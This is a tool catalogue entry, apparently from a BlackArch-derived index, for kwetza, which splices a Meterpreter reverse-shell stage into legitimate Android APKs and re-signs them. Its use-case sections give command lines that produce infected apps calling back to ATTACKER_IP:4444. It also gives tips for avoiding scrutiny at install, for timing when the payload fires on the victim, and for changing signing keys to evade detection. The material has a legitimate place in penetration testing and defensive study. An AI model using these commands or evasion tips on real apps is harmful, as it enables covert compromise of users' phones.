---
name: "kwetza"
categories:
  - blackarch-backdoor
version: "26.0e50272"
homepage: "https://github.com/sensepost/kwetza"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: GPL2
meta-checked: "2026-11-09"
github-repo: "sensepost/kwetza"
github-stars: 646
github-pushed: "2023-07-21"
github-archived: false
github-issues: 29
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# kwetza

> SensePost Python 2 tool that decompiles an existing Android APK with apktool, splices a Meterpreter payload into it, optionally adds permissions, rebuilds and re-signs it.

## What it's for

kwetza ("to infect", South African slang) weaponizes apps people already trust: instead of shipping a standalone payload APK, it takes a real application, injects a Meterpreter stage into a launch activity via smali, and hands back the same-looking app with your implant inside. It can ride the app's existing permissions or bolt on extra ones (`yes`/`no` argument) for more capability; payload templates and the signing keystore live in the `payload/` folder and can be swapped (default keystore password is literally `password` — replace it for anything serious). It depends on apktool being on PATH and jarsigner for signing. Being a 2016/2017-era Python 2 project, modern Android security (signature checks, Play Protect, target-SDK constraints) limits where its stock templates pass, but the decompile-inject-rebuild-sign workflow it automates is still the canonical APK-infection pattern.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Infect an APK with a Meterpreter payload over https

Wrap an existing app with an https reverse Meterpreter and grant it extra permissions.

```
python kwetza.py hackme.apk https ATTACKER_IP 4444 yes
```

Outcome: kwetza decompiles `hackme.apk`, injects the payload into the manifest's launch activity, adds the extra evil permissions, rebuilds via apktool and signs with the bundled keystore (passphrase `password`); the infected build lands at `hackme/dist/hackme.apk`, ready to deploy and call back to ATTACKER_IP:4444.

### Keep the original app's permission set

Infect without changing the manifest's permissions, to avoid scrutiny at install time.

```
python kwetza.py hackme.apk tcp ATTACKER_IP 4444 no
```

Outcome: the rebuilt APK differs only by the injected smali stage using the app's existing permissions and a raw TCP transport; install prompts look identical to the original app's.

### Target a specific activity instead of the launcher

Point the injection at a chosen activity to control exactly when the payload fires.

```
python kwetza.py hackme.apk https ATTACKER_IP 4444 yes com.moo.another.activity
```

Outcome: kwetza logs `USING CUSTOM ACTIVITY` and splices the stage into `com.moo.another.activity`, so the callback triggers when the victim opens that screen rather than at app launch.

### Swap in your own payload template and signing key

Replace the defaults to change the implant's fingerprint.

```
keytool -genkey -v -keystore payload/my.keystore -alias kwetza -keyalg RSA -validity 10000
```

Outcome: with your keystore in `payload/` (renamed over the default or referenced in `kwetza.py`) and any custom smali template dropped alongside, subsequent builds are signed and stamped by your material instead of the publicly known one everyone detects.
